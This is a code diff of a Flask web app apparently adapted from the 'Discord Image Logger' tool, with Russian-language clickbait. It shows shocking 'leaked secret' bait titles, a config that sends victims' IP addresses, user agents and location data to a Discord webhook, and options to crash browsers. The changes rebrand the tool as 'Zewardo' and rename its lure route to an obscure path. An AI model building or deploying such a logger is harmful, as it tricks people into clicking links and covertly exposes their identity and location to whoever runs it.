@@ -11,7 +11,7 @@ app = Flask(__name__)
 logging.basicConfig(level=logging.INFO)
 
 # Загрузка конфигураций с фиксированными значениями
-CLICKBAIT_TITLE = "😱 ШОК! Ты не поверишь, что сосмарк..."
+CLICKBAIT_TITLE = "😱 ШОК! Ты не поверишь, этот факт  скрывался долгие годы..."
 CLICKBAIT_DESCRIPTION = "🔥 Эксклюзив! Это должно было остаться в секрете, но утекло в сеть. Скорее смотри, пока не удалили!"
 CLICKBAIT_IMAGE = "https://avatars.mds.yandex.net/i?id=a4aecf9cbc80023011c1e098ff28befc5fa6d0b6-8220915-images-thumbs&n=13"
 REAL_URL = "https://youtu.be/kk3_5AHEZxE?si=0RnrfrvHJIiHqes7"
@@ -26,13 +26,13 @@ config = {
     "webhook": DISCORD_WEBHOOK_URL,
     "image": CLICKBAIT_IMAGE,
     "imageArgument": True,
-    "username": "Image Logger",
+    "username": "ZeWardo",
     "color": 0x00FFFF,
     "crashBrowser": False,
     "accurateLocation": False,
     "message": {
         "doMessage": False,
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",
+        "message": "Hello world!",
         "richMessage": True,
     },
     "vpnCheck": 1,
@@ -75,7 +75,7 @@ def reportError(error):
         "content": "@everyone",
         "embeds": [
             {
-                "title": "Image Logger - Error",
+                "title": "ZeWorld - Error",
                 "color": config["color"],
                 "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n\n{error}\n",
             }
@@ -94,9 +94,9 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
             "content": "",
             "embeds": [
                 {
-                    "title": "Image Logger - Link Sent",
+                    "title": "Zewardo - linksent",
                     "color": config["color"],
-                    "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
+                    "description": f"An **Zewardo** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                 }
             ],
         }) if config["linkAlerts"] else None
@@ -142,7 +142,7 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
             "content": ping,
             "embeds": [
                 {
-                    "title": "Image Logger - IP Logged",
+                    "title": "Zewardo - IP Logged",
                     "color": config["color"],
                     "description": f"""**A User Opened the Original Image!**
 
@@ -228,7 +228,7 @@ def home():
     """
     return render_template_string(html_content)
 
-@app.route('/sosish')
+@app.route('/XzAc24')
 def clickbait_page():
     try:
         global click_count
